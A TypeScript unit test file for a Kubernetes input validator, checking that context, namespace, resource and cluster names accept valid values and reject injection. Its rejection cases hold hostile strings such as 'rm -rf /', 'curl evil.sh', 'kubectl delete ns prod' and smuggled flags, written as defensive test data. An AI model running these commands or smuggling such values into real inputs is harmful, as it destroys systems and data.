import { describe, it, expect } from 'vitest';
import {
  assertContext,
  assertResourceType,
  assertNamespace,
  assertResourceName,
  assertClusterName,
} from '../utils/k8s-validate';

describe('k8s-validate', () => {
  describe('assertContext', () => {
    it('accepts valid context names', () => {
      expect(() => assertContext('kind-my-cluster')).not.toThrow();
      expect(() =>
        assertContext('arn:aws:eks:us-east-1:123:cluster/x')
      ).not.toThrow();
    });
    it('rejects injection payloads', () => {
      expect(() => assertContext('ctx; rm -rf /')).toThrow();
      expect(() => assertContext('ctx `whoami`')).toThrow();
      expect(() => assertContext('ctx && curl evil.sh')).toThrow();
      expect(() => assertContext('')).toThrow();
    });
    it('rejects values that look like flags', () => {
      expect(() => assertContext('--kubeconfig=/evil')).toThrow();
    });
  });

  describe('assertResourceType', () => {
    it('accepts valid types', () => {
      expect(() => assertResourceType('pods')).not.toThrow();
      expect(() => assertResourceType('deployments.apps')).not.toThrow();
    });
    it('rejects injection payloads', () => {
      expect(() => assertResourceType('pods;ls')).toThrow();
      expect(() => assertResourceType('pods -A')).toThrow();
    });
  });

  describe('assertNamespace', () => {
    it('accepts RFC 1123 labels and "all"', () => {
      expect(() => assertNamespace('default')).not.toThrow();
      expect(() => assertNamespace('kube-system')).not.toThrow();
      expect(() => assertNamespace('all')).not.toThrow();
    });
    it('rejects invalid namespaces', () => {
      expect(() => assertNamespace('Default')).toThrow();
      expect(() => assertNamespace('ns; ls')).toThrow();
      expect(() => assertNamespace('-leading')).toThrow();
    });
  });

  describe('assertResourceName', () => {
    it('accepts valid names', () => {
      expect(() => assertResourceName('my-pod-123')).not.toThrow();
      expect(() => assertResourceName('pod.name_v2')).not.toThrow();
    });
    it('rejects injection payloads and flags', () => {
      expect(() => assertResourceName('p1; kubectl delete ns prod')).toThrow();
      expect(() => assertResourceName('p1$(reboot)')).toThrow();
      expect(() => assertResourceName('--all')).toThrow();
    });
  });

  describe('assertClusterName', () => {
    it('accepts valid cluster names', () => {
      expect(() => assertClusterName('test-cluster')).not.toThrow();
    });
    it('rejects injection payloads', () => {
      expect(() => assertClusterName('x; rm -rf /')).toThrow();
      expect(() => assertClusterName('-bad')).toThrow();
    });
  });
});
